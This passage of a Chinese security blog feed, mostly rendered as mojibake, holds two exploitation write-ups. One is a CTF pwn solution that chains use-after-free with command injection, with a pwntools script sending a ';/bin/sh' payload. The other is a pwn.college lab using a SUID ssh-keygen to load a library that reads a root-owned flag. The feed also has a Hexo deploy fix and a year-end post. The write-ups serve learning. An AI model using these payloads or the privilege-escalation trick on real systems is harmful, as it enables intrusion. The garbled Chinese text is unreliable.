      <span class="comment">// malloc memory</span></span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;strdup&quot;</span>);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;strdup(%p) = %p\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check_format()å‡½æ•°ä¸­<code>strcpy(accept, &quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;);</code>å°†ç‰¹å®šå­—ç¬¦å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„ä¸­</p><p><code>strspn(str, accept) == strlen(str);</code>å°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ä¸ç‰¹å®šå­—ç¬¦æ¯”è¾ƒ,å¦‚æœç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å…¨éƒ¨å±äºç‰¹å®šå­—ç¬¦ä¸­,åˆ™è¿”å›true(1),å¦åˆ™è¿”å›false(0)</p><p><strong>size_t strspn(const char *str1, const char *str2)</strong> æ£€ç´¢å­—ç¬¦ä¸² <strong>str1</strong> ä¸­ç¬¬ä¸€ä¸ªä¸åœ¨å­—ç¬¦ä¸² <strong>str2</strong> ä¸­å‡ºç°çš„å­—ç¬¦ä¸‹æ ‡ã€‚è¯¥å‡½æ•°è¿”å› str1 ä¸­ç¬¬ä¸€ä¸ªä¸åœ¨å­—ç¬¦ä¸² str2 ä¸­å‡ºç°çš„å­—ç¬¦ä¸‹æ ‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">check_format</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> accept[<span class="number">51</span>]; <span class="comment">// [rsp+5h] [rbp-43h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(str, accept) == <span class="built_in">strlen</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print()å‡½æ•°ä¸­<code>__snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#39;%s&#39;&quot;, bss, ptr);</code>æ˜¯å°†<code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;,bss,ptr</code>,%då¯¹åº”bss,%så¯¹åº”ptr,å†™åˆ°commandæ•°ç»„ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">2048</span>]; <span class="comment">// [rsp+8h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(command, <span class="number">2048LL</span>, <span class="number">1LL</span>, <span class="number">2048LL</span>, <span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>, bss, ptr);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>);</span><br><span class="line">    setenv(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>ç¨‹åºæµç¨‹å¤§æ¦‚çœ‹çš„å·®ä¸å¤š,ä¸‹ä¸€æ­¥å¯»æ‰¾æ¼æ´ç‚¹</p><p>exit()å‡½æ•°å†…è°ƒç”¨freeå´æ²¡æœ‰å°†æŒ‡é’ˆç½®ç©º,å­˜åœ¨uaf</p><p>ä¸Šè¿°print()å‡½æ•°è°ƒç”¨<code>system(command);</code>å­˜åœ¨å‘½ä»¤æ³¨å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);<span class="number">99</span></span><br><span class="line">  <span class="keyword">if</span> ( (s[<span class="number">0</span>] &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸¤ä¸ªæ¼æ´,æˆ‘ä»¬æƒ³ä¸€æƒ³å¦‚ä½•åˆ©ç”¨</p><p>æœ€ä¸ºç›´è§‚çš„æƒ³æ³•,å°±æ˜¯å‘½ä»¤æ³¨å…¥æ‰§è¡Œ<code>system(/bin/sh);</code>æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°<code>__snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#39;%s&#39;&quot;, bss, ptr);</code>å‚æ•°ptrå¯ä»¥å°†ç”¨æˆ·çš„è¾“å…¥å†™å…¥command,ä½†æ˜¯è¾“å…¥å‚æ•°pträ¸­çš„å†…å®¹ä¼šè¢«check_format()å‡½æ•°æ£€æŸ¥,åªæœ‰è¾“å…¥çš„å­—ç¬¦å…¨éƒ¨ç¬¦åˆæ‰èƒ½é€šè¿‡,ç›´æ¥å†™æ˜¯è‚¯å®šè¡Œä¸é€šçš„,è¿™æ—¶uafå°±æ´¾ä¸Šç”¨åœºäº†</p><p>é¦–å…ˆ,æˆ‘ä»¬å…ˆè¿›èœå•1,æ‰§è¡Œ<code>strdup(str);</code>åˆ†é…å †ç©ºé—´å,ptræŒ‡å‘è¿™æ®µå †ç©ºé—´(ä¿è¯åˆ†é…çš„ç©ºé—´freeåèƒ½è¿›fastbinæˆ–tcache)</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136668.png" alt="search"></p><p>è¿›èœå•5,free(ptr),ptræŒ‡å‘çš„è¿™æ®µå†…å­˜ç©ºé—´ä¼šæ”¾åœ¨fastbin(glibc &gt;&#x3D; 2.27,åˆ™ä¼šæ”¾å…¥tcache),ptræˆä¸ºæ‚¬ç©ºæŒ‡é’ˆ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136665.png" alt="bins"></p><p>è¿›èœå•3,æ‰§è¡Œ<code>strdup(str);</code>å°½é‡ä¿è¯åˆ†é…å­—èŠ‚æ•°ä¸ç¬¬ä¸€æ­¥åˆ†é…çš„ä¸€è‡´,è¿™æ ·ä½¿å¾—mallocçš„å†…å­˜æ˜¯åˆšåˆšæ”¾å…¥fastbinçš„å†…å­˜,ç°åœ¨valueå’Œpträ¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜,è¿™æ ·ä¿®æ”¹valueæŒ‡å‘çš„å†…å­˜å®é™…ä¸Šä¹Ÿæ˜¯ä¿®æ”¹ptræŒ‡å‘çš„å†…å­˜,è¿™å°±ç»•è¿‡äº†åªèƒ½è¾“å…¥ç‰¹å®šå­—ç¬¦çš„é™åˆ¶</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136666.png" alt="heap"></p><p>å½“ç„¶æ­¤ç¨‹åºæ²¡æœ‰æä¾›editåŠŸèƒ½,æ‰€ä»¥æˆ‘ä»¬åœ¨è¿›èœå•3æ—¶å°±å°†payloadæ„é€ å¥½,<code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;</code>åœ¨åŸå…ˆçš„commandå­—ç¬¦ä¸²ä¸Š,æˆ‘ä»¬å¯ä»¥åŠ¨æ‰‹è„šçš„åœ°æ–¹å°±æ˜¯<code>%s</code>,æ˜¾ç„¶,ç›´æ¥å¡«&#x2F;bin&#x2F;shæ˜¯<code>&#39;/bin/sh&#39;</code>è¡Œä¸é€šã€‚æˆ‘ä»¬å¯ä»¥ç”¨<code>&#39;&#39;</code>é—­åˆ,<code>;</code>åˆ†éš”commandå‘½ä»¤,ä½¿å…¶å¯ä»¥æ‰§è¡Œ<code>;</code>å‰å’Œ<code>;</code>åçš„å‘½ä»¤,åŒæ—¶pwntoolsä¸­sendline(bâ€™â€™â€™â€™)è¯­æ³•æ˜¯é”™çš„,æ‰€ä»¥éœ€è¦<code>\</code>è½¬ä¹‰,æœ€åpayloadåº”ä¸º<code>sendline(b&#39;\&#39;;/bin/sh\&#39;&#39;)</code></p><p>x32:fastbinä¸­chunkèŒƒå›´<strong>0x10-0x40</strong>,æœ€å°çš„chunkä¸º<strong>0x10</strong></p><p>x64:fastbinä¸­chunkèŒƒå›´<strong>0x20-0x80</strong>,tcacheä¸­chunkèŒƒå›´<strong>0x20åˆ°0x410</strong>,ä¸€èˆ¬æƒ…å†µä¸‹æœ€å°çš„chunkä¸º<strong>0x20</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./time&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;61.147.171.105&#x27;,51218)</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_format</span>(<span class="params"><span class="built_in">format</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Format:&#x27;</span>,<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Are you sure you want to exit (y/N)? &#x27;</span>,<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_zone</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Time zone: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">set_format(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">exit()</span><br><span class="line">set_zone(<span class="string">b&#x27;\&#x27;;/bin/sh\&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">CTF Wiki</a></p><p><a href="https://www.cnblogs.com/oldoldcoder/p/15435057.html#scroller-4">time_formatteræ”»é˜²ä¸–ç•Œå­¦ä¹ </a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²ä¸–ç•Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh-keygenææƒ</title>
      <link href="/posts/1ca7db7c/"/>
      <url>/posts/1ca7db7c/</url>
      
        <content type="html"><![CDATA[<p>pwn.collegeçš„level51å¡äº†å¥½ä¹…ï¼Œå†™æ–‡ç« è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹</p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>suid(set uid)æ˜¯linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œsuidå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥åˆ©ç”¨suidææƒçš„æ ¸å¿ƒå°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„suidçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚</p><p>suidç‰¹ç‚¹æ˜¯ç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰suidæƒé™ï¼Œç¨‹åºè¿è¡Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚</p><h1 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h1><p>è¿è¡Œchallengeç›®å½•ä¸‹çš„babysuid_level51ï¼Œé¢˜ç›®å‘Šè¯‰æˆ‘ä»¬ssh-keygenè®¾ç½®äº†suidä½ï¼Œå¹¶ç»™äº†è¦åŠ è½½è‡ªå·±çš„ä»£ç çš„æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This challenge is part of a series of programs that</span><br><span class="line">show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).</span><br><span class="line"></span><br><span class="line">I just set the SUID bit on /usr/bin/ssh-keygen.</span><br><span class="line">Try to use it to read the flag!</span><br></pre></td></tr></table></figure><p><code>ssh-keygen -D ./</code>å¯ä»¥åŠ è½½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç¼–å†™ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“çœ‹çœ‹</p><p><code>ls -l</code>or<code>ll</code>æŸ¥çœ‹ç›®å½•æƒé™ï¼Œå‘ç°hackerç”¨æˆ·(ç”¨æˆ·)åœ¨<code>home/hacker</code>ç›®å½•ä¸‹æœ‰rwxæƒé™</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202402280056786.png" alt="ç›®å½•æƒé™"></p><p><code>cd home/hacker</code>è¿›å…¥hackerç›®å½•ï¼Œ<code>touch test.c</code>åˆ›å»ºcæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc test.c -shared -o test.so </code>ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“</p><h1 id="æ˜“å‡ºé”™ç‚¹"><a href="#æ˜“å‡ºé”™ç‚¹" class="headerlink" title="æ˜“å‡ºé”™ç‚¹"></a>æ˜“å‡ºé”™ç‚¹</h1><p><code>ssh-keygen -D ./test.so</code>åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œç„¶åä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.so does not contain expected string C_GetFunctionList</span><br><span class="line">provider test.so is not a PKCS11 library</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æç¤ºæˆ‘ä»¬test.soä¸åŒ…å«å­—ç¬¦ä¸²C_GetFunctionList(test.so does not contain expected string C_GetFunctionList)ï¼Œåªéœ€è®©æˆ‘ä»¬çš„test.cåŒ…å«å­—ç¬¦ä¸²C_GetFunctionListå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡æ–°æ‰§è¡Œä¸Šè¿°å‘½ä»¤ï¼ŒæˆåŠŸè®©ssh-keygenæ‰§è¡Œäº†ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">C_GetFunctionList for provider ./test.so failed: 12</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä»£ç ä½¿å…¶è¯»å–flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn.college&#123;xxxxxx&#125;</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li><p><a href="https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4+2=8G8Y=P5QwD&alichlgref=https://www.google.com/#toc-13">æµ…è°ˆlinux suidææƒ</a></p></li><li><p><a href="https://pwn.college/fundamentals/program-misuse">Program Misuse</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn.college </category>
          
      </categories>
      
      
        <tags>
            
            <tag> suid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>error spawn failedæŠ¥é”™</title>
      <link href="/posts/159ace20/"/>
      <url>/posts/159ace20/</url>
      
        <content type="html"><![CDATA[<p>æ•´ç†äº†ä¸€ä¸‹åšå®¢,å‘ç°<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d </code>æŠ¥é”™<code>error spawn failed...</code>,è®°å½•ä¸‹è§£å†³æ–¹æ³•</p><h2 id="æŠ¥é”™åŸå› "><a href="#æŠ¥é”™åŸå› " class="headerlink" title="æŠ¥é”™åŸå› "></a>æŠ¥é”™åŸå› </h2><ol><li>å¦‚æœ<code>.deploy_git</code>é‡Œçš„æ–‡ä»¶è¢«ä¿®æ”¹å¯èƒ½å‡ºç°æ­¤é—®é¢˜,å‚è€ƒæ–¹æ³•ä¸€</li><li><code>ssh -vT git@github.com</code>æµ‹è¯•æ˜¯å¦èƒ½è¿é€š,è‹¥å‡ºç°<code>ssh: connect to host xx.xx.xx.xx port 22: Connection timed out</code>,22ç«¯å£å¯èƒ½è¢«é˜²ç«å¢™æˆ–è¿è¥å•†å±è”½,å‚è€ƒæ–¹æ³•äºŒ</li></ol><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><ol><li>åˆ é™¤<code>.deploy_git</code></li><li><code>git config --global core.autocrlf false</code></li><li><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></li></ol><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>åœ¨<code>C:\Users\USERNAME\.ssh</code>ä¸­æ‰¾åˆ°configæ–‡ä»¶,æ²¡æœ‰çš„è¯æ–°å»ºä¸€ä¸ª,<code>USERNAME</code>ä¸ºç”µè„‘ç”¨æˆ·å,åœ¨configæ–‡ä»¶å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†™åœ¨2023ç»“æŸ</title>
      <link href="/posts/93aed580/"/>
      <url>/posts/93aed580/</url>
      
        <content type="html"><![CDATA[<p>è¿˜æœ‰ä¸€å¤©2023å¹´å°±è¦ç»“æŸäº†ï¼Œä¸€å¹´å›é¡¾ä¸‹æ¥ï¼Œè¿˜çœŸæ˜¯å‘ç”Ÿäº†ä¸å°‘äº‹ã€‚æƒ³æƒ³ä¹‹å‰çš„ç»å†ï¼Œè®°å¿†å·²ç»æ¨¡ç³Šäº†ä¸å°‘ï¼Œè¶ç°åœ¨è¿˜æœ‰å°‘è®¸æ®‹å­˜ï¼Œè®°å½•ä¸‹æ¥ï¼Œæƒå½“ç•™å¿µã€‚</p><p>å…¥å‘å®‰å…¨å¤§æ¦‚æ˜¯åœ¨ä¸‰æœˆä»½ï¼Œå›æƒ³èµ·æ¥ï¼Œå½“åˆå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„æƒ³æ³•(<del>æˆ–è€…è¯´æƒ³æ³•æ—©å°±è¢«æˆ‘å¿˜æ‰äº†</del>)ï¼Œå°±æ˜¯è§‰å¾—å¾ˆæœ‰è¶£ï¼Œäºæ˜¯å°±æœé›†äº›èµ„æ–™å­¦ä¹ ã€‚å­¦ç€å­¦ç€å‘ç°ä¸€ä¸ªäººæå¤ªæ— èŠäº†ï¼Œå­¦ä¹ è·¯çº¿ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œè¿™æ—¶å€™å®éªŒå®¤æ­£å¥½æ‹›æ–°ï¼Œæœºç¼˜å·§åˆä¹‹ä¸‹å°±è¿›å…¥åˆ°å®éªŒå®¤ã€‚åœ¨å®éªŒå®¤å­¦ä¹ æ‰“æ¯”èµ›ï¼Œæˆé•¿çš„å¾ˆå¿«(<del>ä¹Ÿè®¸å¹¶ä¸å¿«</del>)ï¼ŒåŒæ—¶ä¹Ÿå¾ˆç´¯ã€‚ä¸ŠåŠå¹´åŠå®Œå›½èµ›ï¼Œè€ƒè¯•å®Œå°±æ”¾å‡äº†ã€‚å‡æœŸé‡Œæ‹¿äº†ä¸ªé©¾ç…§ï¼Œå…¶ä»–æ²¡å¹²ä»€ä¹ˆã€‚ä¸‹åŠå¹´ä¸æ˜¯ç–«æƒ…åˆæ˜¯æµæ„Ÿï¼Œå¤©å¤©å‘çƒ§ï¼Œèº«ä½“æ¢å¤çš„å¾ˆæ…¢ï¼Œå­¦ä¹ è¿›åº¦ä¹Ÿæ…¢äº†ä¸å°‘ã€‚æ¥ä¸‹æ¥çš„è®¡åˆ’ï¼Œæå®Œhouse ofç³»åˆ—åï¼Œå­¦ä¸€ä¸‹iotå’Œbrowserï¼Œå¸Œæœ›2024èƒ½åœ¨äºŒè¿›åˆ¶å®‰å…¨åšå‡ºä¸€ç‚¹æˆç»©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¹´ç»ˆæ€»ç»“ </category>
          
      </categories>
